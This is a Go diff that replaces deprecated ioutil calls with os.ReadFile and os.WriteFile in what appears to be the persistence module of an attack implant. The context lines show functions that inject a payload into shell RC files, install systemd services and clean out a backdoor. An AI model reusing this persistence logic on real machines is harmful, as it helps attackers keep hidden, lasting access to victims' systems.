@@ -8,7 +8,6 @@ package main
 import (
 	"bytes"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -180,13 +179,13 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 	if err != nil {
 		if os.IsNotExist(err) {
 			// Create file if it doesn't exist
-			return ioutil.WriteFile(filepath, []byte(payload), 0644)
+			return os.WriteFile(filepath, []byte(payload), 0644)
 		}
 		return err
 	}
 
 	// Read existing content
-	content, err := ioutil.ReadFile(filepath)
+	content, err := os.ReadFile(filepath)
 	if err != nil {
 		return err
 	}
@@ -201,7 +200,7 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 	newContent := append(content, []byte("\n"+payload)...)
 
 	// Write back with original permissions
-	return ioutil.WriteFile(filepath, newContent, info.Mode())
+	return os.WriteFile(filepath, newContent, info.Mode())
 }
 
 // handleSystemdPersistence installs systemd service
@@ -268,7 +267,7 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	serviceContent := c.generateSystemdService(name, execPath, true)
 
 	// Write service file
-	if err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
+	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
 			Output:   fmt.Sprintf("Failed to write service file: %v", err),
 			ExitCode: 1,
@@ -311,7 +310,7 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	serviceContent := c.generateSystemdService(name, execPath, false)
 
 	// Write service file
-	if err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
+	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
 			Output:   fmt.Sprintf("Failed to write service file: %v", err),
 			ExitCode: 1,
@@ -457,7 +456,7 @@ func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
 
 // cleanRCFile removes backdoor from RC file
 func (c *PersistenceCommand) cleanRCFile(filepath string) error {
-	content, err := ioutil.ReadFile(filepath)
+	content, err := os.ReadFile(filepath)
 	if err != nil {
 		return err
 	}
@@ -491,7 +490,7 @@ func (c *PersistenceCommand) cleanRCFile(filepath string) error {
 	}
 
 	// Write back cleaned content
-	return ioutil.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0644)
+	return os.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0644)
 }
 
 // removeSystemdPersistence removes systemd service
